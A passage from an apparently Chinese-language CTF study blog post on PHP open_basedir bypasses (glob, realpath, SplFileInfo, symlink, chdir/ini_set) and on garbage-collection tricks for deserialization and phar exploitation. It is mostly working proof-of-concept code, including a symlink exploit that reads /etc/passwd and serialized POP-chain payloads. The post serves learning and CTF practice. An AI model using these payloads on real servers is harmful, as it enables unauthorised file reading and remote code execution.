DirectoryIterator(\"glob://ext/spl/examples/*.php\"); foreach($it as $f) { printf(\"%s: %.1FK \", $f-&gt;getFilename(), $f-&gt;getSize()/1024); } ?&gt; 但是单独的glob是无法绕过的，局限性在于它只能列出根目录与open_basedir执行目录下的文件，其他的就不行了，而且也不能读取文件内容。 接下来就是p神总结的方法了，我直接搬过来上篇文章写的了，但除了那些还有很多。 DirectoryIterator + Glob 列举目录 DirectoryIterator是PHP 5之后添加的一个类，为用户提供一个简单的查看目录的接口。而glob：数据流包装器是从PHP 5.3.0开始有效的，用来查找匹配的文件路径。 上payload： &lt;?php // 输出当前PHP配置中的open_basedir值，open_basedir限制脚本只能访问指定的目录及其子目录。 printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); // 创建一个空数组，用于存储文件列表。 $file_list = array(); // DirectoryIterator是PHP的内置类，可以用于遍历文件夹和文件 // 代码中使用glob:///*来列出由glob函数支持的所有匹配的文件。 $it = new DirectoryIterator(\"glob:///*\"); // 遍历DirectoryIterator返回的每个文件（文件名） foreach($it as $f) { // 将文件名添加到$file_list数组中，$f-&gt;__toString()返回当前遍历到的文件的路径名。 $file_list[] = $f-&gt;__toString(); } //这次是为了遍历隐藏文件（以.开头的特殊文件）。同样也使用了glob://协议。 $it = new DirectoryIterator(\"glob:///.*\"); //同理 foreach($it as $f) { $file_list[] = $f-&gt;__toString(); } //进行文件名的排序，为了美观 sort($file_list); //输出得到的所有文件 foreach($file_list as $f){ echo \"{$f}&lt;br/&gt;\"; } ?&gt; 这里跟着GPT学习一波上述代码的逻辑，这里懒得配环境了，就直接借用p神的了~~~ 执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件： 不过这里的测试是在linux环境下才可以的，并且还有一个缺点就是要求php版本为5.3以上，但p神又说5.5/5.6可能有修复，但还没看到。。。这里先不管了 realpath列举目录 这个realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。 在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录），但该文件（目录）是存在的话，他将抛出错误（File is not within the allowed path(s)）。 那这很明显了，我们只需要判断报错信息，就可以得到该文件是否存在了，也就是暴力破解，这个错误信息用err_handle()函数捕捉：当猜解某个存在的文件时，会因抛出错误而进入err_handle()，当猜解某个不存在的文件时，将不会进入err_handle()。 但缺点就是效率太低，上千万次才可以跑完，这肯定不行的，但p神这时候就想到了windows下的通配符：&lt;、&gt; 这里就懵逼了，windows下通配符不是?、*吗，这两个符号是什么鬼，随后看到评论区p神让我们看看这个漏洞 wooyun-2014-071540 上述标记处他打错了，这里说在php+windows+iis环境下这两个符号可以等价于通配符，嗷吼，怪不得，payload如下 &lt;?php ini_set('open_basedir', dirname(__FILE__));//获取php.ini中的open_basedir信息 printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));//将其遍历打印出来 set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; realpath($file);//将所有自定义得到的文件绝对路径传入到其中，它会根据是否存在而选择报错与否，紧接着就会触发isexists } function isexists($errno, $errstr) { $regexp = '/File\\((.*)\\) is not within/';//匹配File xxx is not within的文本 preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\"%s &lt;br/&gt;\", $matches[1]);//如果匹配到则将匹配到的内容打印出来 } } ?&gt; 执行可以看到： Open_basedir为c:\\wamp\\www，但我们列举出了d:/test/目录下的文件，不过只能列举出首字母不同的文件，首字母相同的话，就需要添加第二个字符再接着枚举、第三个字符etc… 这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。 SplFileInfo::getRealPath列举目录 这时p神又在想，如果我们的realpath被ban了该如何，随后他在PHP5.1.2之后找到了一个新引入的类，SplFileInfo，其提供一个对文件进行操作的接口，其中有一个getRealPath方法与realpath很像，都是获取绝对路径用的。但区别点在于这个getRealPath方法是完全无视open_basedir存在的，当我们传入一个不存在的路径时，会返回false，当该路径存在时，他会直接返回正常的绝对路径，接下来看p神的poc： &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); $basedir = 'D:/test/'; $arr = array(); $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for ($i=0; $i &lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');//将构造的路径传入该类，并实例化 $re = $info-&gt;getRealPath();//调用getrealpath方法，尝试获取绝对路径 if ($re) { dump($re);//如果存在，则转到dump函数进行处理 } } function dump($s){ echo $s . '&lt;br/&gt;';//输出得到的文件绝对路径 ob_flush(); flush(); } ?&gt; 这里附上对ob_flush()与flush()的解释： 这个 dump 函数可能主要用于调试目的，当开发者想要得到实时输出并即时观察脚本执行信息时。在脚本执行期间，输出通常会缓存起来，直到达到一定量或脚本执行完毕后一次性发送到浏览器。通过使用 ob_flush() 和 flush()，开发者可以强制立即输出数据，这对于监视长时间运行的脚本非常有用。 同样可以列举，这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。 GD库imageftbbox/imagefttext列举目录 GD库一般是PHP必备的拓展库之一，这里我们看p神的分析： 我拿imageftbbox举个例子，这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 这很清晰了，特点类似于realpath，看poc： &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; //$m = imagecreatefrompng(\"zip.png\"); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa'); imageftbbox(100, 100, $file, 'aaa');//将构造的文件路径传给imageftbbox方法，出错的话则会调用isexists方法 } function isexists($errno, $errstr) { global $file; if (stripos($errstr, 'Invalid font filename') === FALSE) { printf(\"%s&lt;br/&gt;\", $file);//如果报错信息不是Invalid font filename的话，则输入文件路径 } } ?&gt; 我们可以看到成功爆出，但却只能爆出一个字符，但注意的是这里的特殊通配符是起了作用的，只不过在最终输出的时候通配符并没有转换为相应的字符。因此这种方法比realpath麻烦的点在于，需要一位一位爆破。 bindtextdomain暴力猜解目录 先看p神的分析： bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：http://php.net/manual/en/function.gettext.php） Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。 这个函数的特点在于第二个参数directory，如果文件路径存在则返回具体的路径，不存在则返回false，poc如下 &lt;?php printf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); $re = bindtextdomain('xxx', $_GET['dir']); var_dump($re); ?&gt; 这里可以看到依旧可以绕过open_basedir，缺点在于只能在linux环境下才可以，但在linux下又不能使用通配符来猜解目录，所以这是一个没有办法的办法。。。。 这里附上linux下又不能使用通配符来猜解目录的原因： 在Linux系统中，通过正常的shell环境中使用通配符（如 * 和 ?）来进行文件匹配和简单的模式匹配通常是可行的。然而，通配符通常不用于“猜解”（或称枚举）目录，因为shell通配符的匹配规则并不支持猜解目录结构中未知的部分。 例如，* 可用于匹配任意数量的字符，而 ? 可匹配任意单个字符。这些通配符可以匹配已知模式的文件和目录名称，但它们无法用来发现系统上未知或隐藏的目录。也就是说，你不能通过它们来猜解由未知字符组成的目录名称。 opendir+readdir+glob绕过 opendir作用为打开目录句柄 readdir作用为从目录句柄中读取目录 脚本如下： &lt;?php $a = $_GET['c']; if ( $b = opendir($a) ) { while ( ($file = readdir($b)) !== false ) { echo $file.\"&lt;br&gt;\"; } closedir($b); } ?&gt; 虽然只能列目录，php7可以用如下方法读非根目录文件,glob:///*/www/../* 可列举 /var如下图 可见成功绕过 利用 scandir+glob绕过 scandir()函数可以列出指定路径中的文件和目录 利用symlink绕过 symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。 symlink(string $target, string $link): bool symlink()对于已有的 target 建立一个名为 link 的符号连接，而target一般情况下受限于open_basedir。 官方的domo: &lt;?php $target = 'uploads.php'; $link = 'uploads'; symlink($target, $link); echo readlink($link); # 将会输出'uploads.php'这个字符串 ?&gt; 如果将要读取/etc/passwdpoc如下，这里由于我和师傅的环境不一致，就直接cv了 &lt;?php mkdir(\"A\"); chdir(\"A\"); mkdir(\"B\"); chdir(\"B\"); mkdir(\"C\"); chdir(\"C\"); mkdir(\"D\"); chdir(\"D\"); chdir(\"..\"); chdir(\"..\"); chdir(\"..\"); chdir(\"..\"); symlink(\"A/B/C/D\",\"SD\"); symlink(\"SD/../../../../etc/passwd\",\"POC\"); unlink(\"SD\"); mkdir(\"SD\"); ?&gt; 访问web后,将会生成名为POC的文件 分析一下poc过程: 创建A/B/C/D目录，并返回到起始目录 symlink(\"A/B/C/D\",\"SD\"):创建符号文件SD，指向A/B/C/D symlink(\"SD/../../../../etc/passwd\",\"POC\"):创建符号文件POC,指向SD/../../../../etc/passwd。此时SD=A/B/C/D,而A/B/C/D../../../../=/var/www/html,符合open_basedir的限制,创建成功。 unlink(“SD”):删除软链接SD，并创建一个文件夹，此时SD作为一个真正的目录存在并且SD在html目录下。那么访问POC，指向的是SD/../../../../etc/passwd,SD/../../../就是/var目录,/var/../etc/passwd恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。（因为link是不受open_basedir的限制） 这里需要跨几层目录就需要创建几层目录。 最后附上p牛EXP &lt;?php /* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */ header('content-type: text/plain'); error_reporting(-1); ini_set('display_errors', TRUE); printf(\"open_basedir: %s php_version: %s \", ini_get('open_basedir'), phpversion()); printf(\"disable_functions: %s \", ini_get('disable_functions')); $file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd'); $relat_file = getRelativePath(__FILE__, $file); $paths = explode('/', $file); $name = mt_rand() % 999; $exp = getRandStr(); mkdir($name); chdir($name); for($i = 1 ; $i &lt; count($paths) - 1 ; $i++){ mkdir($paths[$i]); chdir($paths[$i]); } mkdir($paths[$i]); for ($i -= 1; $i &gt; 0; $i--) { chdir('..'); } $paths = explode('/', $relat_file); $j = 0; for ($i = 0; $paths[$i] == '..'; $i++) { mkdir($name); chdir($name); $j++; } for ($i = 0; $i &lt;= $j; $i++) { chdir('..'); } $tmp = array_fill(0, $j + 1, $name); symlink(implode('/', $tmp), 'tmplink'); $tmp = array_fill(0, $j, '..'); symlink('tmplink/' . implode('/', $tmp) . $file, $exp); unlink('tmplink'); mkdir('tmplink'); delfile($name); $exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\"; $exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\"; echo \" -----------------content--------------- \"; echo file_get_contents($exp); delfile('tmplink'); function getRelativePath($from, $to) { // some compatibility fixes for Windows paths $from = rtrim($from, '\\/') . '/'; $from = str_replace('\\\\', '/', $from); $to = str_replace('\\\\', '/', $to); $from = explode('/', $from); $to = explode('/', $to); $relPath = $to; foreach($from as $depth =&gt; $dir) { // find first non-matching dir if($dir === $to[$depth]) { // ignore this directory array_shift($relPath); } else { // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining &gt; 1) { // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, '..'); break; } else { $relPath[0] = './' . $relPath[0]; } } } return implode('/', $relPath); } function delfile($deldir){ if (@is_file($deldir)) { @chmod($deldir,0777); return @unlink($deldir); }else if(@is_dir($deldir)){ if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) { $name = File_Str($deldir.'/'.$file); if(($file!='.') &amp;&amp; ($file!='..')){delfile($name);} } @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; } } function File_Str($string) { return str_replace('//','/',str_replace('\\\\','/',$string)); } function getRandStr($length = 6) { $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $randStr = ''; for ($i = 0; $i &lt; $length; $i++) { $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); } return $randStr; } 利用chdir与ini_set绕过 chdir将工作目录切换到指定的目录,函数原型为 chdir(string $directory): bool ini_seti用来设置php.ini的值，无需打开php.ini文件，就能修改配置。函数原型为: ini_set(string $option, string $value): string|false 设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。 bypass原理大概open_basedir设计逻辑的安全问题，分析过程参考:从PHP底层看open_basedir bypass 这里看了文章发现是深入PHP底层的，咱这也看不懂。。。只能总结一下漏洞点，问题是出现在expand_filepath()函数上，这个函数在处理路径变化时，只关注绝对路径，但没有考虑open_basedir为相对路径时会变化的问题，构造思路如下 首先需要构造一个相对可上跳的open_basedir mkdir('sky'); chdir('sky'); ini_set('open_basedir','..'); 这也是为什么要先创文件夹的原因，就是为了在当前目录构造可以..的ini_set，然后每次目录操作 chdir('..'); 都会进行一次open_basedir的比对，即php_check_open_basedir_ex。由于相对路径的问题，每次open_basedir的补全都会上跳。 比如初试open_basedir为/a/b/c/d 第一次chdir后变为/a/b/c， 第二次chdir后变为/a/b， 第三次chdir后变为/a， 第四次chdir后变为/ 那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。 所以通用的payload基本如下： &lt;?php mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));?&gt; 0x02 wake_up绕过 PHP-GC垃圾回收机制 这里看到下面的绕过方法基本都是该GC机制引起的，故此先来学习一下前置知识。 何为GC Gc，全称Garbage collection，即垃圾回收机制，在PHP中有这个GC机制 PHP中的GC 在PHP中，使用引用计数和回收周期来自动管理内存对象，当一个变量被设置为NULL，或者没有任何指针指向的时候，他就会被变成垃圾，被GC机制自动回收。 其实说白了就是当一个对象没有被引用时，就会被GC回收，在回收的时候他会自动调用destruct析构函数，而这也就是我们绕过抛出异常的关键点，接下来了解一下什么是引用计数 引用计数 当我们PHP创建一个变量时，这个变量会被存储在一个名为zval的变量容器中。在这个zval变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。 第一个字节名为is_ref，是bool值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用&amp;来使用自定义引用，zval变量容器中还有一个内部引用计数机制，来优化内存使用。 第二个字节是refcount，它用来表示指向zval变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。 展示几个例子： &lt;?php $a = \"new string\"; xdebug_debug_zval('a'); //用于查看变量a的zval变量容器的内容 ?&gt; 输出如上，这里看着和文章不一样，因为我们很明显只定义了一个变量，但这里的refcount的值却是2，随后询问了GPT发现是函数的问题，当我们使用xdebug_debug_zval来检查变量时，xdebug会创建这个变量的一个副本以防止修改原始变量，这个过程将增加zval的引用计数。 接下来我们添加一个引用 &lt;?php $a = \"new string\"; $b = &amp;$a; xdebug_debug_zval('a'); //用于查看变量a的zval变量容器的内容 ?&gt; 如上图这里refcount，看到这里依旧发现refcount是2，在这是因为此时a和b变量共同使用同一个地址，那他们实际上会共同指向变量a所在zval结构，也就是同一个zval被两个变量所引用，因此refcount=2 接下来说一下容器的销毁这个事，变量容器在refcount变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,refcount就会减1。看个例子 &lt;?php $a=\"new string\"; $b =&amp;$a; $c =&amp;$b; xdebug_debug_zval('a'); unset($b,$c);//销毁变量b和c xdebug_debug_zval('a'); ?&gt; 这里看到在unset了b和c之后refcount恢复到了1，但是is_ref的值却成为了1，按常理来说，这里销毁了b和c变量，那么a变量就没有被引用了，is_ref的值应该为0。我们看看GPT的回答： 当你销毁其中的一个或多个引用变量，即使使用了unset，剩下的变量（这里是$a）仍然保持原始zval的状态，其中包括它的is_ref和refcount的值。 unset($b, $c); // 销毁变量$b和$c 这时候，你销毁了变量$b和$c。现在对应的zval只剩下$a一个引用。此时，引用计数（refcount）将减少，但is_ref仍然保持原来的值，因为这个标志表示zval是否可以被作为引用，并不是说它是否当前被引用。 xdebug_debug_zval('a'); 在第二次调用xdebug_debug_zval时，你可以看到refcount应该已经减少，但is_ref标志仍然为1，因为它是表示变量$a的zval曾经被设置为引用。由于PHP的内部优化，除非再次对变量做出修改，否则is_ref标志通常不会因unset操作而被改变。 也就是说除非我们将对变量a引用的代码块删除，或者重新创建一个变量a，这时候会产生一个新的zval结构，而该新结构并未被引用，此时is_ref为0 GC在PHP 反序列化中的利用 GC如果在PHP反序列化中生效，那它就会直接触发_destruct方法，接下来以例子来演示。 demo1 首先来看变量被unset函数处理的情况 &lt;?php highlight_file(__FILE__); error_reporting(0); class test{ public $num; public function __construct($num) { $this-&gt;num = $num; echo $this-&gt;num.\"__construct\".\"&lt;/br&gt;\"; } public function __destruct(){ echo $this-&gt;num.\"__destruct()\".\"&lt;/br&gt;\"; } } $a = new test(1); unset($a); $b = new test(2); $c = new test(3); ?&gt; //输出如下： //1__construct //1__destruct() //2__construct //3__construct //3__destruct() //2__destruct() 可以看到对象a的析构函数在调用unset之后就触发了，与下面两个相比，该析构函数的调用提前了 还有一种方法，就是当对象为NULL的时候也可以直接触发析构函数，demo如下 &lt;?php show_source(__FILE__); $flag = \"flag\"; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET['1']); throw new Exception('你想干什么'); ?&gt; 我们可以看到如果正常传入反序列化字符串，是无法调用析构函数的，直接就被抛出错误，这离我们需要明确的一点是： 反序列化操作本身并不会自动触发析构函数；析构函数的调用要么是因为对象将不再被引用（对于局部变量，会在其作用域结束时发生），要么是因为整个脚本的执行已经结束（对于全局变量）。 对应到上述代码就是我们的unserialize($_GET['1']);被赋值给了变量a，但a是一个全局变量，只有当脚本执行结束之后a的生命周期才会结束，此时才会调用析构函数，但是在脚本结束前，被throw new Exception('你想干什么');抛出了异常，那么PHP会因为这个异常而直接中断脚本的执行，这导致了变量a的析构函数没有机会被调用 脚本终止后，所有剩余的清理工作（包括析构函数调用）将在脚本执行退出的清理过程中完成。或者如果脚本由于异常而终止，析构函数可能根本没有被调用，因为PHP尝试先处理异常。 那此时我们将变量a删除看看 &lt;?php show_source(__FILE__); $flag = \"flag\"; class B { function __destruct() { global $flag; echo $flag; } } $poc = new B(); echo serialize($poc); unserialize($_GET['1']); throw new Exception('你想干什么'); ?&gt; 可以看到虽然依旧被抛出了异常，但我们的析构函数也被正常调用了。这是由于unserialize($_GET['1']);没有赋值给其他变量，也就是说在调用完unserialize之后，这个对象就立即没有了对它的引用，此时的PHP GC机制判断出该对象没有了引用，就是调用垃圾回收机制，将其回收，这时候就会调用析构函数来清理。 但如果真实环境下，这里就是被某个变量引用了，我们如何绕过异常来调用析构函数呢，即如何提前触发GC垃圾回收机制，这里看看大师傅如何绕过的，它采用反序列化一个数组来尝试绕过 &lt;?php show_source(__FILE__); class B { function __destruct() { global $flag; echo $flag; } } $a=array(new B,0); echo serialize($a); ?&gt; 得到序列化文本如下 a:2:{i:0;O:1:\"B\":0:{}i:1;i:0;} //对象类型:长度:{类型:长度;类型:长度:类名:值类型:长度;类型:长度;} //数组:长度为2:{int型:长度0;类:长度为1:类名为\"B\":值为0 int型:值为1：int型;值为0 接下来这位师傅将第二个索引置空，就可以触发GC回收机制，因此修改序列化文本为 a:2:{i:0;O:1:\"B\":0:{}i:0;i:0;} 可以看到成功绕过 这里我认为是将两个索引都改为了同一个，这导致指针出了问题，也就是在开始的时候对象B的索引为0，也就是a[0]=B，之后又来了一个a[0]=0，因此前者的引用消失了，也就成功触发析构函数了 Gc在Phar反序列化中的利用 Gc在Phar反序列化中类似于PHP反序列化，也是当遇到抛出异常时，可以借用上面的方法来实现绕过，下面以demo来简单讲解一下。 demo2 &lt;?php highlight_file(__FILE__); class Test{ public $code; public function __destruct(){ eval($this -&gt; code); } } $filename = $_GET['filename']; echo file_get_contents($filename); throw new Error(\"Garbage collection\"); ?&gt; 这里看到file_get_contents函数和eval，毫无疑问就是phar反序列化了。payload如下 &lt;?php //ini_set(\"phar.readonly\", 0); class Test{ public $code; } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $a = new Test(); $a = 'phpinfo()'; $o = array($a, 0); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 用编辑器打开后，我们可以利用上述思路来修改此处的索引，以此来绕过异常，但注意的是phar文件中不能随意修改数据，否则就会因为签名错误而导致文件出错，但签名可以进行伪造，所以我们依旧可以先直接修改，之后重新计算文件签名 import urllib.parse from hashlib import sha1 with open('D:\\\\PphProject\\\\Scripts\\\\1.phar', 'rb') as file: f = file.read() s = f[:-28] # 获取要签名的数据 h = f[-8:] # 获取签名类型和GBMB标识 newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open('newtest.phar', 'wb') as file: file.write(newf) # 写入新文件 接下来就利用phar伪协议即可：filename=phar://D:\\PphProject\\Scripts ewtest.phar CTF例题 这道题是H3018大师傅在知识分享时的例题，在这里引用一下，源码如下 &lt;?php highlight_file(__FILE__); error_reporting(0); class cg0{ public $num; public function __destruct(){ echo $this-&gt;num.\"hello __destruct\"; } } class cg1{ public $string; public function __toString() { echo \"hello __toString\"; $this-&gt;string-&gt;flag(); } } class cg2{ public $cmd; public function flag(){ echo \"hello __flag()\"; eval($this-&gt;cmd); } } $a=unserialize($_GET['code']); throw new Exception(\"Garbage collection\"); ?&gt; 这道题的话思路比较简单，poc如下： &lt;?php class cg0{ public $num; } class cg1{ public $string; } class cg2{ public $cmd; } $pop = new cg0(); $pop-&gt;num = new cg1(); $pop-&gt;num-&gt;string = new cg2(); $pop-&gt;num-&gt;string-&gt;cmd = 'phpinfo();'; $a = array($pop, 0); echo serialize($a); ?&gt; a:2:{i:0;O:3:\"cg0\":1:{s:3:\"num\";O:3:\"cg1\":1:{s:6:\"string\";O:3:\"cg2\":1:{s:3:\"cmd\";s:10:\"phpinfo();\";}}}i:1;i:0;}//正常payload a:2:{i:0;O:3:\"cg0\":1:{s:3:\"num\";O:3:\"cg1\":1:{s:6:\"string\";O:3:\"cg2\":1:{s:3:\"cmd\";s:10:\"phpinfo();\";}}}i:0;i:0;}//修改后的payload 如下图成功绕过 CTFSHOW卷王杯-easy unserialize &lt;?php include(\"./HappyYear.php\"); class one { public $object; public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } public function __destruct() { @$this-&gt;object-&gt;add(); } public function __toString() { return $this-&gt;object-&gt;string; } } class second { protected $filename; protected function addMe() { return \"Wow you have sovled\".$this-&gt;filename; } public function __call($func, $args) { call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { $this-&gt;string = $string; } public function __get($name) { $var = $this-&gt;$name; $var[$name](); } } if (isset($_GET[\"ctfshow\"])) { $a=unserialize($_GET['ctfshow']); throw new Exception(\"高一新生报道\"); } else { highlight_file(__FILE__); } 这个反序列化也让我学到了很多点，对我这彩笔来说有点难，这里也是参考了一下wp才想明白的思路： 首先定位到敏感字段echo $flag;那我们就要想如何调用mememe方法了，搜寻一番可能会找不到，但仔细分析会发现call_user_func([$this, $func.\"Me\"], $args);存在Me的字符，我们看一下这个函数的作用 call_user_func — 把第一个参数作为回调函数调用 也就是说这里的[$this, $func.\"Me\"]参数会被当做一个函数去对待，后面的args则是该函数的参数，那这里意味着我们可以构造出mememe方法。 接下来在思考如何调用其所在的call方法：需要找一个不存在的属性的地方，那很明显就是$this-&gt;object-&gt;add();此处了，这两个地方相互配合又会去调用addMe方法，接着会触发tostring。 在该方法下有$this-&gt;object-&gt;string;这里大概率是想要调用third类的get方法，因为string数不可访问的属性。最后就是$var[$name]();这一重要的点了，我们可以在PHP文档中找到如下信息： 可以看到如果我们有这样的代码： $var = [new one(), 'MeMeMe']; //则$var();就会去调用new one对象的mememe方法了 至此链子打通了： 反序列化入口-&gt;one.destruct-&gt;second.call-&gt;second.addMe-&gt;one.tostring-&gt;third.get-&gt;one.MeMeMe 还有最后一个点 public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } 这里的if语句如何绕过，我们先了解array_walk函数的用法 简单例子如下： &lt;?php $fruits = array(\"d\" =&gt; \"lemon\", \"a\" =&gt; \"orange\", \"b\" =&gt; \"banana\", \"c\" =&gt; \"apple\"); function test_alter(&amp;$item1, $key, $prefix) { $item1 = \"$prefix: $item1\"; } function test_print($item2, $key) { echo \"$key. $item2&lt;br /&gt; \"; } echo \"Before ...: \"; array_walk($fruits, 'test_print'); array_walk($fruits, 'test_alter', 'fruit'); echo \"... and after: \"; array_walk($fruits, 'test_print'); ?&gt; 可以看到该函数会将第二个参数当做函数，而该函数最多接受两个参数，接受的第一个参数就是array_walk的第一个参数，而第二个参数来自array_walk的第三个参数（这个参数可写可不写）这里不具体分析了，我们可以简单测试一下 &lt;?php highlight_file(__FILE__); class one { public $year_parm; public $object; public function MeMeMe() { array_walk($this, function ($fn, $prev) { if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { echo 'success'; } }); } } $a = new one(); $a-&gt;year_parm = array('Happy_func'); $a-&gt;MeMeMe(); ?&gt; 如上图添加了一个$year_parm变量，我们看输出如何，如下图。 也就是说其中的$this会去遍历当前对象的每个公共属性，即$year_parm与$object，随后的自定义function函数中fn变量是属性的值，prev变量代表属性的名字。 即如果传入$a-&gt;year_parm = array(‘Happy_func’);，则array_walk在调用的时候是这样的。 $fn='Happy_func'&amp;$prev='year_parm' 至此我们可以写poc了 &lt;?php class one { public $year_parm = array('Happy_func'); public $object; public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } public function __destruct() { @$this-&gt;object-&gt;add(); } public function __toString() { return $this-&gt;object-&gt;string; } } class second { public $filename; protected function addMe() { return \"Wow you have sovled\".$this-&gt;filename; } public function __call($func, $args) { call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { $this-&gt;string = $string; } public function __get($name) { $var = $this-&gt;$name; $var[$name](); } } $pop = new one(); $pop-&gt;object = new second(); $pop-&gt;object-&gt;filename = new one(); $pop-&gt;object-&gt;filename-&gt;object = new third(array(\"string\"=&gt;[new one(),\"MeMeMe\"])); $a = array($pop, 0); $a = serialize($a); $b = str_replace('i:1;i:0;', 'i:0;i:0;', $a); //echo $b; echo urlencode($b); ?&gt; 解释一下这里的赋值new third(array(\"string\"=&gt;[new one(),\"MeMeMe\"])); 因为这里我们调用的是__get方法，而此前我们是这样调用的$this-&gt;object-&gt;string;这里的object为third对象实例，这样在调用get后，get其中的$name变量的值就是string（可以自行测试验证），而之后存在$var = $this-&gt;$name;这一行代码，即$var = $this-&gt;$string;而$string=[new one(),\"MeMeMe\"]至此变量var成功被赋值为数组 就这一个题废了1个小时。。。太菜了 NSSCTF prize_p1 &lt;?php highlight_file(__FILE__); class getflag { function __destruct() { echo getenv(\"FLAG\"); } } class A { public $config; function __destruct() { if ($this-&gt;config == 'w') { $data = $_POST[0]; if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) { die(\"我知道你想干吗，我的建议是不要那样做。\"); } file_put_contents(\"./tmp/a.txt\", $data); } else if ($this-&gt;config == 'r') { $data = $_POST[0]; if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) { die(\"我知道你想干吗，我的建议是不要那样做。\"); } echo file_get_contents($data); } } } if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) { die(\"我知道你想干吗，我的建议是不要那样做。\"); } unserialize($_GET[0]); throw new Error(\"那么就从这里开始起航吧\"); 这里看到getflag类直接就能输出flag但是在反序列化以前，通过正则过滤了flag和get关键字，因此对于直接利用getflag类这种办法就行不通了，虽然对于这种正则的绕过，我们可以使用数组，就像这样?0[]=XXX，但是后面的值就被PHP解析为数组，导致无法正常反序列化。 